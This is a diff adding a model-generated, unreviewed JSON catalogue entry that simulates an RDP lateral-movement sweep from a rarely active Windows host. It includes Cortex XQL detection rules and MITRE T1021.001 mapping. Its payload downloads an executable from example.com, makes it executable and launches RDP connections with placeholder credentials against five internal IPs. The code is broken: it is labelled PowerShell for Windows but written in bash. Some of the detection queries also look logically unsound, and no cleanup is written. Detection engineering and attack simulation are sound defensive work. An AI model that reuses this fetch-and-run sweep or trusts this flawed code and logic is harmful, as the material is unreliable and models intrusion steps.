@@ -1,0 +1,148 @@
+{
+  "id": "TTP-0000-0017",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Rarely-Active Host Conducts Lateral RDP Sweep",
+    "summary": "A rarely-active Windows host initiates outbound RDP connections to multiple internal hosts in a short time window, mimicking lateral movement. Cortex should detect this abnormal behavior as a potentia",
+    "description": "A rarely-active Windows host initiates outbound RDP connections to multiple internal hosts in a short time window, mimicking lateral movement. Cortex should detect this abnormal behavior as a potential reconnaissance or exploitation attempt."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.001",
+        "name": "Remote Services",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/cortexsim\nwget -O /tmp/cortexsim/rdesktop.exe https://example.com/rdesktop.exe\nchmod +x /tmp/cortexsim/rdesktop.exe\nfor ip in 10.0.1.10 10.0.1.11 10.0.1.12 10.0.1.13 10.0.1.14; do\n  /tmp/cortexsim/rdesktop.exe -u user -p pass $ip -port 3389 &\ndone\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound RDP connections to multiple internal hosts",
+        "expected_value": "dst_port = 3389 and action_remote_ip in (\"10.0.1.10\", \"10.0.1.11\", \"10.0.1.12\", \"10.0.1.13\", \"10.0.1.14\")"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Abnormal RDP Connection Behavior",
+        "description": "Detection of RDP connections from a rarely-seen host to multiple internal hosts within a short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter actor_process_image_name = \"rdesktop.exe\"\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname, dst_ip\n| comp count() as connection_count\n| filter connection_count > 5",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Abnormal RDP connections to multiple hosts from a rarely seen host",
+        "description": "ML-based detection of RDP connections initiated by an infrequently active host to multiple internal IPs",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname\n| comp count() as rdp_count\n| filter rdp_count > 5\n| filter agent_hostname in (\"rarely-active-host\")",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "RDP connection to multiple hosts from rarely-seen host",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect RDP sweep from rarely active host",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389\n| filter agent_hostname not in (\"known-host-1\", \"known-host-2\")\n| comp count() as cnt by agent_hostname, dst_ip\n| comp count() as connection_count\n| filter connection_count > 5",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Abnormal RDP connections to multiple hosts from a rarely seen host; Required Data: XDR Agent; ATT&CK T1021.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Abnormal RDP connections to multiple hosts from a rarely seen host",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/abnormal-rdp-connections-to-multiple-hosts-from-a-rarely-seen-host",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1021.001",
+      "url": "https://attack.mitre.org/techniques/T1021/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
